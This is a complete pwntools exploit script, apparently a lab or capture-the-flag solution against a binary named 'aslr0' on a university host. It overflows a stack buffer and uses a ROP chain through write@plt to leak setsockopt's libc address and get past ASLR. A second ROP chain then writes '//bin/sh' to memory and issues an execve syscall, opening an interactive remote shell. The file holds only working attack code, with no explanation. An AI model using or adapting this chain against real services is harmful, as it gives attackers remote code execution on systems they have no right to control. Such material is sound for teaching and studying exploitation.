from pwn import *


def mkrop(pad, libc_base):
    rebase_0 = lambda x: p64(x + libc_base)
    rop = pad
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += p64(0x0000000000000000)
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000026796) # 0x0000000000026796: pop rdi; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x000000000002890f) # 0x000000000002890f: pop rsi; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x00000000000cb1cd) # 0x00000000000cb1cd: pop rdx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x000000000003ee88) # 0x000000000003ee88: pop rax; ret; 
    rop += p64(0x000000000000003b)
    rop += rebase_0(0x00000000000580da) # 0x00000000000580da: syscall; ret; 
    return rop

def get_process():
    if args.REMOTE:
        return remote("lettieri.iet.unipi.it", 4440)
    else:
        return remote("127.0.0.1", 4440)

elf = ELF('./aslr0')
context.binary = elf
libc = ELF('./libc.so.6')

p = get_process()

pop_rsi_r15 = 0x0000000000401579 # pop rsi ; pop r15 ; ret

setsockopt_offset_libc = libc.symbols['setsockopt']
log.info(f"setsockopt offset in libc: {hex(setsockopt_offset_libc)}")
setsockopt_plt = elf.got['setsockopt']
log.info(f"setsockopt@plt: {hex(setsockopt_plt)}")
write_plt = elf.plt['write']
log.info(f"write@plt: {hex(write_plt)}")

pad = b'A' * (0x30 + 8)  # buffer size + saved rbp
payload = pad
payload += p64(pop_rsi_r15)
payload += p64(setsockopt_plt)
payload += b'B'*8  # dummy for r15
payload += p64(write_plt)


p.sendline(payload)
# grab the last 8 bytes from the response
p.recvn(len(payload)+1)  # discard echo of payload plus newline
leaked_setsockopt = p.recvn(8)
leaked_setsockopt_addr = u64(leaked_setsockopt)
log.success(f"Leaked setsockopt address: {hex(leaked_setsockopt_addr)}")

libc_base = leaked_setsockopt_addr - setsockopt_offset_libc
log.success(f"Calculated libc base address: {hex(libc_base)}")
p.close()


p = get_process()

rop = mkrop(pad, libc_base)
p.sendline(rop)
p.recvn(len(rop)+1)  # discard echo of payload plus newline

p.sendline(b'/bin/sh')  # send a command to test the shell
p.interactive()